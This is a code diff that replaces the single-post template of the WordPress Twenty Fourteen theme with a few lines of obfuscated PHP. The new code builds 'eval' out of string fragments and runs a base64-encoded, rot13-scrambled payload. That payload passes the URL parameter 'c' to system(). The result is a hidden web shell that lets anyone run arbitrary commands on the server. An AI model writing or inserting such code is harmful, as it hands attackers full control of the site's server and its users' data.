@@ -1,51 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The Template for displaying all single posts
- *
- * @package WordPress
- * @subpackage Twenty_Fourteen
- * @since Twenty Fourteen 1.0
- */
-
-get_header(); ?>
-
-	<div id="primary" class="content-area">
-		<div id="content" class="site-content" role="main">
-			<?php
-			// Start the Loop.
-			while ( have_posts() ) :
-				the_post();
-
-				/*
-				 * Include the post format-specific template for the content. If you want
-				 * to use this in a child theme, then include a file called content-___.php
-				 * (where ___ is the post format) and that will be used instead.
-				 */
-				get_template_part( 'content', get_post_format() );
-
-				// Previous/next post navigation.
-				twentyfourteen_post_nav();
-
-				// If comments are open or we have at least one comment, load up the comment template.
-				if ( comments_open() || get_comments_number() ) {
-					comments_template();
-				}
-				endwhile;
-			?>
-		</div><!-- #content -->
-	</div><!-- #primary -->
-
-<?php
-get_sidebar( 'content' );
-get_sidebar();
-get_footer();
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIEdyemN5bmdyIHNiZSBxdmZjeW5sdmF0IG55eSBmdmF0eXIgY2JmZ2YKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9TYmhlZ3JyYQogKiBAZnZhcHIgR2pyYWdsIFNiaGVncnJhIDEuMAogKi8KCnRyZ191cm5xcmUoKTsgPz4KCgk8cXZpIHZxPVwiY2V2em5lbFwiIHB5bmZmPVwicGJhZ3JhZy1uZXJuXCI+CgkJPHF2aSB2cT1cInBiYWdyYWdcIiBweW5mZj1cImZ2Z3ItcGJhZ3JhZ1wiIGVieXI9XCJ6bnZhXCI+CgkJCTw/Y3VjCgkJCS8vIEZnbmVnIGd1ciBZYmJjLgoJCQlqdXZ5ciAoIHVuaXJfY2JmZ2YoKSApIDoKCQkJCWd1cl9jYmZnKCk7CgoJCQkJLyoKCQkJCSAqIFZhcHlocXIgZ3VyIGNiZmcgc2Jlem5nLWZjcnB2c3ZwIGdyemN5bmdyIHNiZSBndXIgcGJhZ3JhZy4gVnMgbGJoIGpuYWcKCQkJCSAqIGdiIGhmciBndXZmIHZhIG4gcHV2eXEgZ3VyenIsIGd1cmEgdmFweWhxciBuIHN2eXIgcG55eXJxIHBiYWdyYWctX19fLmN1YwoJCQkJICogKGp1cmVyIF9fXyB2ZiBndXIgY2JmZyBzYmV6bmcpIG5hcSBndW5nIGp2eXkgb3IgaGZycSB2YWZncm5xLgoJCQkJICovCgkJCQl0cmdfZ3J6Y3luZ3JfY25lZyggJ3BiYWdyYWcnLCB0cmdfY2JmZ19zYmV6bmcoKSApOwoKCQkJCS8vIENlcml2YmhmL2Fya2cgY2JmZyBhbml2dG5ndmJhLgoJCQkJZ2pyYWdsc2JoZWdycmFfY2JmZ19hbmkoKTsKCgkJCQkvLyBWcyBwYnp6cmFnZiBuZXIgYmNyYSBiZSBqciB1bmlyIG5nIHlybmZnIGJhciBwYnp6cmFnLCB5Ym5xIGhjIGd1ciBwYnp6cmFnIGdyemN5bmdyLgoJCQkJdnMgKCBwYnp6cmFnZl9iY3JhKCkgfHwgdHJnX3BienpyYWdmX2Foem9yZSgpICkgewoJCQkJCXBienpyYWdmX2dyemN5bmdyKCk7CgkJCQl9CgkJCQlyYXFqdXZ5cjsKCQkJPz4KCQk8L3F2aT48IS0tICNwYmFncmFnIC0tPgoJPC9xdmk+PCEtLSAjY2V2em5lbCAtLT4KCjw/Y3VjCnRyZ19mdnFyb25lKCAncGJhZ3JhZycgKTsKdHJnX2Z2cXJvbmUoKTsKdHJnX3NiYmdyZSgpOwoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
